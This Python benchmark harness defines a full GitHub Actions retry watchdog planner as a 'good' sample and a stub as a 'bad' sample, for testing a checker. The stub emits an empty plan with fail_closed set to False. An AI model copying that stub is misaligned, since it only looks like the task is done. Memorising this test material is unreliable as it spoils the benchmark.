#!/usr/bin/env python3
"""Prove the immutable checker accepts safe behavior and rejects unsafe behavior."""

from __future__ import annotations

import json
import os
import runpy
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path


BENCHMARK = Path(__file__).resolve().parent
CHECKER = BENCHMARK / "check.py"
REPOSITORY = BENCHMARK.parents[2]
TRUSTED_PIPELINE = (REPOSITORY / "scripts/regression_verifier_pipeline.py").read_text(
    encoding="utf-8"
)
TRUSTED_PIPELINE_TESTS = (
    REPOSITORY / "scripts/test_regression_verifier_pipeline.py"
).read_text(encoding="utf-8")
TRUSTED_SOURCE_GUARD = (
    REPOSITORY / "scripts/regression_verifier_source_guard.py"
).read_text(encoding="utf-8")
TRUSTED_SOURCE_GUARD_TESTS = (
    REPOSITORY / "scripts/test_regression_verifier_source_guard.py"
).read_text(encoding="utf-8")
SOURCE_GUARD_MODULE = runpy.run_path(
    str(REPOSITORY / "scripts/regression_verifier_source_guard.py")
)
GUARDED_WORKER_FILES = tuple(
    SOURCE_GUARD_MODULE["_guarded_files"](REPOSITORY, "worker-build")
)

GOOD_PLANNER = r'''#!/usr/bin/env python3
import argparse
import hashlib
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path


def parse_time(value):
    return datetime.fromisoformat(value.replace("Z", "+00:00"))


def observation_rank(item):
    values = (
        item.get("workflow_run_id"),
        item.get("workflow_run_attempt"),
        item.get("workflow_job_id"),
    )
    if not all(isinstance(value, int) and value > 0 for value in values):
        raise SystemExit("workflow observation has no monotonic GitHub identity")
    return values


def bound_idempotency_key(
    job_id,
    canonical_job_hash,
    action,
    provider,
    workflow,
    run_id,
    workflow_job_id,
    run_attempt,
    affected_workflow_jobs,
    main_sha,
):
    payload = json.dumps(
        [
            job_id,
            canonical_job_hash,
            action,
            provider,
            workflow,
            run_id,
            workflow_job_id,
            run_attempt,
            affected_workflow_jobs,
            main_sha,
        ],
        separators=(",", ":"),
        sort_keys=True,
    )
    return "sha256:" + hashlib.sha256(payload.encode()).hexdigest()


def allowed_origin(value, official):
    parsed = urllib.parse.urlparse(value)
    return value == official or (
        os.environ.get("WATCHDOG_BENCHMARK_LOOPBACK") == "1"
        and parsed.scheme == "http"
        and parsed.hostname == "127.0.0.1"
        and parsed.port is not None
    )


def fetch_json(base, path, token=None):
    headers = {} if token is None else {"Authorization": "Bearer " + token}
    request = urllib.request.Request(base.rstrip("/") + path, headers=headers)
    with urllib.request.urlopen(request, timeout=5) as response:
        return json.loads(response.read())


class TokenSafeRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, request, fp, code, msg, headers, newurl):
        redirected = super().redirect_request(request, fp, code, msg, headers, newurl)
        if redirected is not None and urllib.parse.urlsplit(request.full_url).netloc != urllib.parse.urlsplit(newurl).netloc:
            redirected.remove_header("Authorization")
        return redirected


def fetch_bytes(base, path, token, maximum=16 * 1024 * 1024):
    request = urllib.request.Request(
        base.rstrip("/") + path,
        headers={"Authorization": "Bearer " + token},
    )
    opener = urllib.request.build_opener(TokenSafeRedirectHandler())
    with opener.open(request, timeout=10) as response:
        body = response.read(maximum + 1)
    if len(body) > maximum:
        raise SystemExit("GitHub artifact archive exceeds the bounded download limit")
    return body


def candidate_membership(github_base, token, run_id):
    payload = fetch_json(
        github_base,
        f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}/artifacts?per_page=100",
        token,
    )
    artifacts = payload.get("artifacts") if isinstance(payload, dict) else None
    if not isinstance(artifacts, list):
        raise SystemExit("GitHub artifacts response is invalid")
    expected_name = f"regression-candidates-{run_id}"
    matches = [
        item for item in artifacts
        if isinstance(item, dict)
        and item.get("name") == expected_name
        and item.get("expired") is False
    ]
    if not matches:
        return {}
    if len(matches) != 1:
        raise SystemExit("runner has duplicate candidate artifacts")
    artifact = matches[0]
    artifact_id = artifact.get("id")
    artifact_size = artifact.get("size_in_bytes")
    if (
        not isinstance(artifact_id, int) or artifact_id <= 0
        or not isinstance(artifact_size, int) or artifact_size <= 0
        or artifact_size > 16 * 1024 * 1024
    ):
        raise SystemExit("candidate artifact metadata is outside the bounded contract")
    archive = fetch_bytes(
        github_base,
        f"/repos/NSPG13/agent-bounties/actions/artifacts/{artifact_id}/zip",
        token,
    )
    try:
        with zipfile.ZipFile(io.BytesIO(archive)) as bundle:
            infos = bundle.infolist()
            names = [item.filename for item in infos if not item.is_dir()]
            if len(names) != len(set(names)) or len(names) > 7:
                raise SystemExit("candidate archive has duplicate or excessive entries")
            if any(
                item.file_size < 0 or item.file_size > 4 * 1024 * 1024
                or item.filename.startswith(("/", "\\"))
                or ".." in item.filename.replace("\\", "/").split("/")
                for item in infos
            ):
                raise SystemExit("candidate archive contains an unsafe entry")
            if "manifest.json" not in names:
                raise SystemExit("candidate archive manifest is missing")
            manifest = json.loads(bundle.read("manifest.json"))
            entries = manifest.get("candidates") if isinstance(manifest, dict) else None
            if (
                not isinstance(manifest, dict)
                or manifest.get("schema") != "agent-bounties/regression-candidate-manifest-v1"
                or manifest.get("network") != "base-mainnet"
                or not isinstance(entries, list)
                or len(entries) > 5
            ):
                raise SystemExit("candidate archive manifest is invalid")
            membership = {}
            expected_files = {"manifest.json"}
            for entry in entries:
                if not isinstance(entry, dict) or set(entry) != {"job_id", "file"}:
                    raise SystemExit("candidate manifest entry is invalid")
                job_id = entry["job_id"]
                filename = entry["file"]
                if not isinstance(job_id, str) or not re.fullmatch(r"[A-Za-z0-9_.:-]{1,200}", job_id):
                    raise SystemExit("candidate manifest job ID is invalid")
                expected_filename = "candidate-" + hashlib.sha256(job_id.encode()).hexdigest() + ".json"
                if filename != expected_filename or filename not in names:
                    raise SystemExit("candidate manifest does not bind its exact file")
                candidate = json.loads(bundle.read(filename))
                embedded = candidate.get("job") if isinstance(candidate, dict) else None
                if (
                    not isinstance(candidate, dict)
                    or candidate.get("schema") != "agent-bounties/regression-candidate-v1"
                    or not isinstance(embedded, dict)
                ):
                    raise SystemExit("candidate artifact schema is invalid")
                if embedded.get("job_id") != job_id or job_id in membership:
                    raise SystemExit("candidate artifact job binding is invalid")
                canonical_payload = json.dumps(embedded, sort_keys=True, separators=(",", ":"))
                membership[job_id] = "0x" + hashlib.sha256(canonical_payload.encode()).hexdigest()
                expected_files.add(filename)
            if set(names) != expected_files:
                raise SystemExit("candidate archive contains an uncommitted file")
            return membership
    except (zipfile.BadZipFile, KeyError, json.JSONDecodeError) as error:
        raise SystemExit("candidate artifact archive is invalid") from error


parser = argparse.ArgumentParser()
sub = parser.add_subparsers(dest="command", required=True)
plan = sub.add_parser("plan")
plan.add_argument("--jobs", required=True)
plan.add_argument("--runs", required=True)
plan.add_argument("--policy", required=True)
plan.add_argument("--now", required=True)
execute = sub.add_parser("execute")
execute.add_argument("--plan", required=True)
execute.add_argument("--repository", required=True)
execute.add_argument("--github-api-base", required=True)
execute.add_argument("--token-env", required=True)
execute.add_argument("--state", required=True)
execute.add_argument("--execute", action="store_true")
execute.add_argument("--allow-workflow", action="append", default=[])
live = sub.add_parser("plan-live")
live.add_argument("--api-base", required=True)
live.add_argument("--repository", required=True)
live.add_argument("--github-api-base", required=True)
live.add_argument("--token-env", required=True)
live.add_argument("--policy", required=True)
live.add_argument("--output", required=True)
live.add_argument("--allow-workflow", action="append", default=[])
args = parser.parse_args()
if args.command == "plan-live":
    if args.repository != "NSPG13/agent-bounties":
        raise SystemExit("repository is not allowlisted")
    if not allowed_origin(args.api_base, "https://api.agentbounties.app"):
        raise SystemExit("Agent Bounties API origin is not pinned")
    if not allowed_origin(args.github_api_base, "https://api.github.com"):
        raise SystemExit("GitHub API origin is not pinned")
    allowed_workflows = [
        "regression-verifier-runner.yml",
        "regression-verifier-signer.yml",
    ]
    if args.allow_workflow != allowed_workflows:
        raise SystemExit("live planner workflow allowlist is not exact")
    token = os.environ.get(args.token_env)
    if not token:
        raise SystemExit("token environment variable is unavailable")
    branch = fetch_json(
        args.github_api_base,
        "/repos/NSPG13/agent-bounties/branches/main",
        token,
    )
    main_sha = branch["commit"]["sha"]
    jobs_payload = fetch_json(
        args.api_base,
        "/v1/base/autonomous-bounties/verification-jobs?network=base-mainnet",
    )
    runs_payload = fetch_json(
        args.github_api_base,
        "/repos/NSPG13/agent-bounties/actions/runs?per_page=100",
        token,
    )
    if not isinstance(jobs_payload, list) or not all(isinstance(item, dict) for item in jobs_payload):
        raise SystemExit("production verification feed must be a bare job array")
    normalized_jobs = []
    for item in jobs_payload:
        required = {
            "job_id", "network", "bounty_contract", "round",
            "eligible_verifiers", "threshold", "verification_expires_at",
            "terms", "submission_evidence",
        }
        if not required.issubset(item) or item.get("network") != "base-mainnet":
            raise SystemExit("production verification job schema is incomplete")
        expires = item["verification_expires_at"]
        if not isinstance(expires, int) or expires <= 0:
            raise SystemExit("production verification expiry must be Unix seconds")
        terms_ready = isinstance(item["terms"], dict)
        evidence_ready = isinstance(item["submission_evidence"], dict)
        canonical_payload = json.dumps(item, sort_keys=True, separators=(",", ":"))
        canonical_hash = "0x" + hashlib.sha256(canonical_payload.encode()).hexdigest()
        normalized = {
            "job_id": item["job_id"],
            "bounty_contract": item["bounty_contract"],
            "round": item["round"],
            "status": "submitted",
            "canonical_job_hash": canonical_hash,
            "submission_hash": item["submission_evidence"].get("evidence_hash")
            if evidence_ready else None,
            "verification_expires_at": datetime.fromtimestamp(
                expires, timezone.utc
            ).isoformat().replace("+00:00", "Z"),
            "required_verifiers": item["eligible_verifiers"],
            "threshold": item["threshold"],
            "input_readiness": "ready" if terms_ready and evidence_ready else "unavailable",
            "canonical_terminal_event": None,
        }
        normalized_jobs.append(normalized)
    jobs_document = {
        "schema": "agent-bounties/regression-verifier-watchdog-jobs-v1",
        "network": "base-mainnet",
        "safe_block": 0,
        "jobs": normalized_jobs,
    }
    workflow_runs = runs_payload.get("workflow_runs") if isinstance(runs_payload, dict) else None
    if not isinstance(workflow_runs, list):
        raise SystemExit("GitHub Actions response must contain workflow_runs")
    normalized_runs = []
    workflow_names = {
        ".github/workflows/regression-verifier-runner.yml": "regression-verifier-runner.yml",
        ".github/workflows/regression-verifier-signer.yml": "regression-verifier-signer.yml",
    }
    relevant_runs = [
        workflow_run for workflow_run in workflow_runs
        if isinstance(workflow_run, dict)
        and workflow_run.get("path") in workflow_names
        and workflow_run.get("head_sha") == main_sha
    ]
    runner_membership = {}
    for workflow_run in relevant_runs:
        if workflow_run["path"] != ".github/workflows/regression-verifier-runner.yml":
            continue
        run_id = workflow_run.get("id")
        if not isinstance(run_id, int) or run_id <= 0:
            raise SystemExit("GitHub workflow run ID is invalid")
        membership = candidate_membership(args.github_api_base, token, run_id)
        if membership:
            runner_membership[run_id] = membership
    for workflow_run in relevant_runs:
        run_id = workflow_run.get("id")
        if not isinstance(run_id, int) or run_id <= 0:
            raise SystemExit("GitHub workflow run ID is invalid")
        path = workflow_run["path"]
        if path == ".github/workflows/regression-verifier-runner.yml":
            membership = runner_membership.get(run_id)
        else:
            title_match = re.fullmatch(
                r"Regression Verifier Signer / candidate run ([1-9][0-9]*)",
                str(workflow_run.get("display_title", "")),
            )
            upstream_run_id = int(title_match.group(1)) if title_match else 0
            membership = runner_membership.get(upstream_run_id)
        if not membership:
            continue
        run_jobs = fetch_json(
            args.github_api_base,
            f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}/jobs?per_page=100",
            token,
        ).get("jobs")
        if not isinstance(run_jobs, list):
            raise SystemExit("GitHub workflow jobs response is invalid")
        for observed in run_jobs:
            name = str(observed.get("name", "")).lower()
            if path.endswith("regression-verifier-runner.yml") and name == "run-no-secrets":
                stage = "runner"
            elif path.endswith("regression-verifier-signer.yml") and name.startswith("sign-one"):
                stage = "signer_one"
            elif path.endswith("regression-verifier-signer.yml") and name.startswith("sign-two"):
                stage = "signer_two"
            elif path.endswith("regression-verifier-signer.yml") and name == "relay":
                stage = "relay"
            else:
                continue
            for normalized in normalized_jobs:
                if membership.get(normalized["job_id"]) != normalized["canonical_job_hash"]:
                    continue
                verifier_index = 0 if stage == "signer_one" else 1
                verifiers = normalized["required_verifiers"]
                signer = (
                    verifiers[verifier_index]
                    if stage.startswith("signer_") and len(verifiers) > verifier_index
                    and observed.get("conclusion") == "success"
                    else None
                )
                normalized_runs.append({
                    "job_id": normalized["job_id"],
                    "stage": stage,
                    "status": observed.get("status"),
                    "conclusion": observed.get("conclusion"),
                    "attempt": observed.get("run_attempt"),
                    "head_sha": workflow_run.get("head_sha"),
                    "workflow": workflow_names[path],
                    "provider_role": {
                        "runner": "runner",
                        "signer_one": "signer_one_primary",
                        "signer_two": "signer_two_primary",
                        "relay": "relay_primary",
                    }[stage],
                    "artifact_hash": (
                        "sha256:" + hashlib.sha256(
                            f"{stage}:{normalized['canonical_job_hash']}:{run_id}".encode()
                        ).hexdigest()
                        if observed.get("conclusion") == "success" else None
                    ),
                    "retryable": observed.get("conclusion") == "failure",
                    "signer": signer,
                    "canonical_job_hash": normalized["canonical_job_hash"],
                    "workflow_run_id": run_id,
                    "workflow_job_id": observed.get("id"),
                    "workflow_run_attempt": observed.get("run_attempt"),
                })
    runs_document = {
        "schema": "agent-bounties/regression-verifier-watchdog-runs-v1",
        "repository": args.repository,
        "current_main_sha": main_sha,
        "runs": normalized_runs,
    }
    policy = json.loads(Path(args.policy).read_text(encoding="utf-8"))
    policy["current_main_sha"] = main_sha
    policy["allowed_workflows"] = allowed_workflows
    now = os.environ.get("WATCHDOG_BENCHMARK_NOW") or datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    with tempfile.TemporaryDirectory(prefix="watchdog-live-plan-") as temporary:
        directory = Path(temporary)
        paths = {
            "jobs": directory / "jobs.json",
            "runs": directory / "runs.json",
            "policy": directory / "policy.json",
        }
        paths["jobs"].write_text(json.dumps(jobs_document), encoding="utf-8")
        paths["runs"].write_text(json.dumps(runs_document), encoding="utf-8")
        paths["policy"].write_text(json.dumps(policy), encoding="utf-8")
        completed = subprocess.run(
            [
                sys.executable,
                __file__,
                "plan",
                "--jobs",
                str(paths["jobs"]),
                "--runs",
                str(paths["runs"]),
                "--policy",
                str(paths["policy"]),
                "--now",
                now,
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            check=False,
            timeout=30,
        )
    if completed.returncode != 0:
        raise SystemExit("live plan generation failed: " + completed.stdout.decode("utf-8", "replace"))
    document = json.loads(completed.stdout)
    document["repository"] = args.repository
    document["current_main_sha"] = main_sha
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(json.dumps(document, sort_keys=True, separators=(",", ":")), encoding="utf-8")
    print(json.dumps({"schema": "agent-bounties/regression-verifier-watchdog-live-plan-v1", "job_count": len(document["jobs"]), "output": str(output)}, sort_keys=True, separators=(",", ":")))
    raise SystemExit(0)
if args.command == "execute":
    document = json.load(open(args.plan, encoding="utf-8"))
    if args.repository != "NSPG13/agent-bounties" or document.get("repository") != args.repository:
        raise SystemExit("repository is not allowlisted")
    if not args.execute or document.get("fail_closed") is not True:
        raise SystemExit("explicit fail-closed execution is required")
    if not allowed_origin(args.github_api_base, "https://api.github.com"):
        raise SystemExit("GitHub API origin is not pinned")
    if args.allow_workflow != [
        "regression-verifier-runner.yml",
        "regression-verifier-signer.yml",
    ]:
        raise SystemExit("executor workflow allowlist is not exact")
    allowed = {
        "retry_runner": "regression-verifier-runner.yml",
        "retry_signer_one": "regression-verifier-signer.yml",
        "retry_signer_two": "regression-verifier-signer.yml",
        "retry_relay": "regression-verifier-signer.yml",
    }
    automated = [item for item in document["jobs"] if item.get("automation_allowed") is True]
    seen_keys = set()
    seen_retry_run_ids = set()
    expected_affected_names = {
        "retry_runner": [("run-no-secrets", "target")],
        "retry_signer_one": [("sign-one / sign", "target"), ("relay", "dependent")],
        "retry_signer_two": [("sign-two / sign", "target"), ("relay", "dependent")],
        "retry_relay": [("relay", "target")],
    }
    for item in automated:
        expected = allowed.get(item.get("next_action"))
        if expected is None or item.get("target_workflow") != expected:
            raise SystemExit("workflow is not allowlisted")
        run_id = item.get("workflow_run_id")
        workflow_job_id = item.get("workflow_job_id")
        run_attempt = item.get("workflow_run_attempt")
        if (
            not isinstance(run_id, int)
            or run_id <= 0
            or not isinstance(workflow_job_id, int)
            or workflow_job_id <= 0
            or not isinstance(run_attempt, int)
            or run_attempt <= 0
        ):
            raise SystemExit("workflow retry requires positive run, job, and attempt IDs")
        affected = item.get("affected_workflow_jobs")
        expected_affected = expected_affected_names[item["next_action"]]
        if (
            not isinstance(affected, list)
            or len(affected) != len(expected_affected)
            or [
                (entry.get("name"), entry.get("effect"))
                for entry in affected
                if isinstance(entry, dict)
            ] != expected_affected
            or any(
                not isinstance(entry.get("workflow_job_id"), int)
                or entry["workflow_job_id"] <= 0
                for entry in affected
            )
            or affected[0]["workflow_job_id"] != workflow_job_id
            or len({entry["workflow_job_id"] for entry in affected}) != len(affected)
        ):
            raise SystemExit("retry does not bind its exact target and dependent jobs")
        expected_key = bound_idempotency_key(
            item.get("job_id"),
            item.get("canonical_job_hash"),
            item.get("next_action"),
            item.get("provider_role"),
            item.get("target_workflow"),
            run_id,
            workflow_job_id,
            run_attempt,
            affected,
            document.get("current_main_sha"),
        )
        if item.get("idempotency_key") != expected_key or expected_key in seen_keys:
            raise SystemExit("idempotency key is not uniquely bound to the canonical action")
        if run_id in seen_retry_run_ids:
            raise SystemExit("only one job retry may target a workflow run")
        seen_keys.add(expected_key)
        seen_retry_run_ids.add(run_id)
    state_path = Path(args.state)
    if state_path.exists():
        state = json.loads(state_path.read_text(encoding="utf-8"))
        if state.get("schema") != "agent-bounties/regression-verifier-watchdog-state-v1":
            raise SystemExit("execution state schema is invalid")
        completed_keys = set(state.get("executed_idempotency_keys", []))
    else:
        completed_keys = set()
    pending = [item for item in automated if item["idempotency_key"] not in completed_keys]
    if not pending:
        print(json.dumps({
            "schema": "agent-bounties/regression-verifier-watchdog-execution-v1",
            "fail_closed": True,
            "executed_count": 0,
            "skipped_count": len(automated),
            "idempotency_keys": [],
        }, sort_keys=True, separators=(",", ":")))
        raise SystemExit(0)
    token = os.environ.get(args.token_env)
    if not token:
        raise SystemExit("token environment variable is unavailable")

    def request(method, path, payload=None):
        body = None if payload is None else json.dumps(payload, separators=(",", ":")).encode()
        req = urllib.request.Request(
            args.github_api_base.rstrip("/") + path,
            data=body,
            method=method,
            headers={"Authorization": "Bearer " + token, "Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            raw = response.read()
            return None if not raw else json.loads(raw)

    branch = request("GET", "/repos/NSPG13/agent-bounties/branches/main")
    if branch["commit"]["sha"] != document.get("current_main_sha"):
        raise SystemExit("plan is not bound to current main")
    remotely_completed = []
    expected_job_names = {
        "retry_runner": "run-no-secrets",
        "retry_signer_one": "sign-one / sign",
        "retry_signer_two": "sign-two / sign",
        "retry_relay": "relay",
    }
    for item in pending:
        run_id = item["workflow_run_id"]
        metadata = request("GET", f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}")
        if (
            metadata.get("path") != ".github/workflows/" + item["target_workflow"]
            or metadata.get("head_sha") != document["current_main_sha"]
        ):
            raise SystemExit("workflow run metadata is not safe to retry")
        current_attempt = metadata.get("run_attempt")
        if not isinstance(current_attempt, int) or current_attempt < item["workflow_run_attempt"]:
            raise SystemExit("workflow run attempt regressed")
        if current_attempt > item["workflow_run_attempt"]:
            attempts = request(
                "GET",
                f"/repos/NSPG13/agent-bounties/actions/runs/{run_id}/jobs?filter=all&per_page=100",
            ).get("jobs")
            target_name = expected_job_names[item["next_action"]]
            if not isinstance(attempts, list) or not any(
                isinstance(job, dict)
                and job.get("run_id") == run_id
                and job.get("name") == target_name
                and isinstance(job.get("run_attempt"), int)
                and job["run_attempt"] > item["workflow_run_attempt"]
                for job in attempts
            ):
                raise SystemExit("run attempt advanced without exact target-job retry evidence")
            remotely_completed.append(item)
            continue
        if metadata.get("status") != "completed" or metadata.get("conclusion") != "failure":
            raise SystemExit("workflow run is not a completed failure")
        for affected in item["affected_workflow_jobs"]:
            affected_id = affected["workflow_job_id"]
            job_metadata = request(
                "GET",
                f"/repos/NSPG13/agent-bounties/actions/jobs/{affected_id}",
            )
            expected_conclusion = "failure" if affected["effect"] == "target" else "skipped"
            if (
                job_metadata.get("id") != affected_id
                or job_metadata.get("run_id") != run_id
                or job_metadata.get("name") != affected["name"]
                or job_metadata.get("status") != "completed"
                or job_metadata.get("conclusion") != expected_conclusion
                or job_metadata.get("run_attempt") != item["workflow_run_attempt"]
            ):
                raise SystemExit("workflow target or dependent job metadata is not safe to retry")
    for item in remotely_completed:
        completed_keys.add(item["idempotency_key"])
    if remotely_completed:
        state_path.parent.mkdir(parents=True, exist_ok=True)
        temporary_state = state_path.with_suffix(state_path.suffix + ".tmp")
        temporary_state.write_text(json.dumps({
            "schema": "agent-bounties/regression-verifier-watchdog-state-v1",
            "executed_idempotency_keys": sorted(completed_keys),
        }, sort_keys=True, separators=(",", ":")), encoding="utf-8")
        os.replace(temporary_state, state_path)
    pending_writes = [item for item in pending if item not in remotely_completed]
    executed = []
    for item in pending_writes:
        workflow_job_id = item["workflow_job_id"]
        request(
            "POST",
            f"/repos/NSPG13/agent-bounties/actions/jobs/{workflow_job_id}/rerun",
        )
        executed.append(item["idempotency_key"])
        completed_keys.add(item["idempotency_key"])
        state_path.parent.mkdir(parents=True, exist_ok=True)
        temporary_state = state_path.with_suffix(state_path.suffix + ".tmp")
        temporary_state.write_text(json.dumps({
            "schema": "agent-bounties/regression-verifier-watchdog-state-v1",
            "executed_idempotency_keys": sorted(completed_keys),
        }, sort_keys=True, separators=(",", ":")), encoding="utf-8")
        os.replace(temporary_state, state_path)
    print(json.dumps({
        "schema": "agent-bounties/regression-verifier-watchdog-execution-v1",
        "fail_closed": True,
        "executed_count": len(executed),
        "skipped_count": len(automated) - len(pending_writes),
        "idempotency_keys": executed,
    }, sort_keys=True, separators=(",", ":")))
    raise SystemExit(0)

jobs_doc = json.load(open(args.jobs, encoding="utf-8"))
runs_doc = json.load(open(args.runs, encoding="utf-8"))
policy = json.load(open(args.policy, encoding="utf-8"))
now = parse_time(args.now)
records = []
reserved_retry_runs = set()
for job in sorted(jobs_doc["jobs"], key=lambda item: (item["verification_expires_at"], item["job_id"])):
    job_runs = [item for item in runs_doc["runs"] if item["job_id"] == job["job_id"]]
    latest = {stage: None for stage in ("runner", "signer_one", "signer_two", "relay")}
    for stage in latest:
        stage_runs = [item for item in job_runs if item["stage"] == stage]
        latest[stage] = max(stage_runs, key=observation_rank) if stage_runs else None
    active_run = next(
        (
            latest[stage]
            for stage in ("runner", "signer_one", "signer_two", "relay")
            if latest[stage] and latest[stage].get("status") in {"queued", "in_progress"}
        ),
        None,
    )
    action = "await_scheduled_runner"
    owner = "regression-verifier-runner"
    automated = False
    provider = "runner"
    reason = "No candidate run exists; the fixed runner schedule owns the next attempt."
    expires = parse_time(job["verification_expires_at"])
    successful_signers = [
        item.get("signer")
        for item in (latest["signer_one"], latest["signer_two"])
        if item
        and item.get("status") == "completed"
        and item["conclusion"] == "success"
    ]
    stale = any(item["head_sha"] != policy["current_main_sha"] for item in job_runs)
    unknown_workflow = any(item["workflow"] not in policy["allowed_workflows"] for item in job_runs)
    canonical_drift = any(
        item.get("canonical_job_hash")
        and item["canonical_job_hash"] != job["canonical_job_hash"]
        for item in job_runs
    )
    nonretryable_failure = any(
        item["conclusion"] == "failure" and not item.get("retryable", False)
        for item in job_runs
    )
    exhausted = any(
        item["conclusion"] == "failure"
        and item["attempt"] >= policy["max_attempts_per_stage"]
        for item in job_runs
    )
    invalid_run_status = any(
        item.get("status") not in {"queued", "in_progress", "completed"}
        for item in job_runs
    )
    terminal = job.get("canonical_terminal_event") or job.get("status") in {"settled", "rejected", "cancelled"}
    if terminal:
        action, owner, automated, provider = "observe_terminal", "canonical-indexer", False, "canonical_chain"
        reason = "A canonical terminal event is authoritative."
    elif expires <= now:
        action, owner, automated, provider = "expire_submission", "permissionless-keeper", False, "canonical_chain"
        reason = "The immutable verification deadline has passed."
    elif job.get("input_readiness") != "ready":
        action, owner, automated, provider = "escalate_no_verdict", "maintainer-on-call", False, "none"
        reason = "The input is unavailable; infrastructure cannot produce a verdict."
    elif (expires - now).total_seconds() < policy["minimum_retry_budget_seconds"]:
        action, owner, automated, provider = "escalate_no_verdict", "maintainer-on-call", False, "none"
        reason = "Too little time remains for a safe bounded retry."
    elif (
        stale
        or unknown_workflow
        or canonical_drift
        or nonretryable_failure
        or exhausted
        or invalid_run_status
        or len(successful_signers) != len(set(successful_signers))
    ):
        action, owner, automated, provider = "escalate_no_verdict", "maintainer-on-call", False, "none"
        reason = "Stale, replay-like, or exhausted evidence blocks automation."
    elif active_run:
        action, owner, automated, provider = (
            "await_active_run",
            "github-actions",
            False,
            active_run["stage"],
        )
        reason = "The selected stage already has a queued or in-progress workflow run."
    else:
        runner = latest["runner"]
        one = latest["signer_one"]
        two = latest["signer_two"]
        relay = latest["relay"]
        if runner and runner["conclusion"] == "failure":
            action, owner, automated, provider = "retry_runner", "regression-verifier-runner", True, "runner"
            reason = "The candidate runner failed retryably."
        elif runner and runner["conclusion"] == "success" and not one:
            action, owner, automated, provider = "await_active_run", "github-actions", False, "signer_one"
            reason = "The candidate artifact exists; the triggered signer run has not appeared yet."
        elif runner and runner["conclusion"] == "success" and one["conclusion"] != "success":
            action, owner, automated, provider = "retry_signer_one", "regression-verifier-signer-one", True, "signer_one_secondary"
            reason = "Signer one is the first missing stage."
        elif one and one["conclusion"] == "success" and not two:
            action, owner, automated, provider = "await_active_run", "github-actions", False, "signer_two"
            reason = "Signer one succeeded; the second signer job has not appeared yet."
        elif one and one["conclusion"] == "success" and two["conclusion"] != "success":
            action, owner, automated, provider = "retry_signer_two", "regression-verifier-signer-two", True, "signer_two_secondary"
            reason = "Signer two is the only missing signer stage."
        elif two and two["conclusion"] == "success" and relay and relay["conclusion"] == "failure":
            action, owner, automated, provider = "retry_relay", "regression-verifier-relay", True, "relay_secondary"
            reason = "Both signers succeeded and only the retryable relay failed."
        elif two and two["conclusion"] == "success" and not relay:
            action, owner, automated, provider = "await_active_run", "github-actions", False, "relay"
            reason = "Both signers succeeded; the relay job has not appeared yet."
        elif two and two["conclusion"] == "success":
            action, owner, automated, provider = "reconcile_canonical_state", "canonical-indexer", False, "canonical_chain"
            reason = "The quorum exists; canonical state must be reconciled."
    target_workflow = None
    workflow_run_id = None
    workflow_job_id = None
    workflow_run_attempt = None
    affected_workflow_jobs = []
    if automated:
        target_workflow = {
            "retry_runner": "regression-verifier-runner.yml",
            "retry_signer_one": "regression-verifier-signer.yml",
            "retry_signer_two": "regression-verifier-signer.yml",
            "retry_relay": "regression-verifier-signer.yml",
        }[action]
        stage = {
            "retry_runner": "runner",
            "retry_signer_one": "signer_one",
            "retry_signer_two": "signer_two",
            "retry_relay": "relay",
        }[action]
        selected_run = latest[stage]
        workflow_run_id = selected_run["workflow_run_id"]
        workflow_job_id = selected_run["workflow_job_id"]
        workflow_run_attempt = selected_run["workflow_run_attempt"]
        affected_workflow_jobs = [{
            "workflow_job_id": workflow_job_id,
            "name": {
                "runner": "run-no-secrets",
                "signer_one": "sign-one / sign",
                "signer_two": "sign-two / sign",
                "relay": "relay",
            }[stage],
            "effect": "target",
        }]
        if action in {"retry_signer_one", "retry_signer_two"}:
            dependent_runs = [
                item for item in job_runs
                if item["stage"] == "relay"
                and item["workflow_run_id"] == workflow_run_id
            ]
            dependent = max(dependent_runs, key=observation_rank) if dependent_runs else None
            if dependent is None or dependent.get("conclusion") != "skipped":
                action = "escalate_no_verdict"
                owner = "maintainer-on-call"
                automated = False
                reason = "The signer retry has no exact skipped relay dependency to authorize."
                target_workflow = None
                workflow_run_id = None
                workflow_job_id = None
                workflow_run_attempt = None
                affected_workflow_jobs = []
            else:
                affected_workflow_jobs.append({
                    "workflow_job_id": dependent["workflow_job_id"],
                    "name": "relay",
                    "effect": "dependent",
                })
        if automated and workflow_run_id in reserved_retry_runs:
            action = "await_shared_retry"
            owner = "github-actions"
            automated = False
            reason = "Another deadline-ordered job owns the same workflow-run retry."
            target_workflow = None
            workflow_run_id = None
            workflow_job_id = None
            workflow_run_attempt = None
            affected_workflow_jobs = []
        elif automated:
            reserved_retry_runs.add(workflow_run_id)
    idempotency_key = bound_idempotency_key(
        job["job_id"],
        job["canonical_job_hash"],
        action,
        provider,
        target_workflow,
        workflow_run_id,
        workflow_job_id,
        workflow_run_attempt,
        affected_workflow_jobs,
        policy["current_main_sha"],
    )
    recheck_at = (
        now + timedelta(seconds=policy["backoff_seconds"])
        if automated
        else now
    ).isoformat().replace("+00:00", "Z")
    records.append({
        "job_id": job["job_id"],
        "canonical_job_hash": job["canonical_job_hash"],
        "verification_expires_at": job["verification_expires_at"],
        "next_action": action,
        "next_owner": owner,
        "automation_allowed": automated,
        "provider_role": provider,
        "target_workflow": target_workflow,
        "workflow_run_id": workflow_run_id,
        "workflow_job_id": workflow_job_id,
        "workflow_run_attempt": workflow_run_attempt,
        "affected_workflow_jobs": affected_workflow_jobs,
        "reason": reason,
        "recheck_at": recheck_at,
        "idempotency_key": idempotency_key,
    })
print(json.dumps({
    "schema": "agent-bounties/regression-verifier-watchdog-plan-v1",
    "network": jobs_doc["network"],
    "generated_at": args.now,
    "fail_closed": True,
    "jobs": records,
}, sort_keys=True, separators=(",", ":")))
'''

BAD_PLANNER = r'''#!/usr/bin/env python3
import json
print(json.dumps({"schema":"agent-bounties/regression-verifier-watchdog-plan-v1","network":"base-mainnet","generated_at":"2026-09-01T12:00:00Z","fail_closed":False,"jobs":[]}))
'''

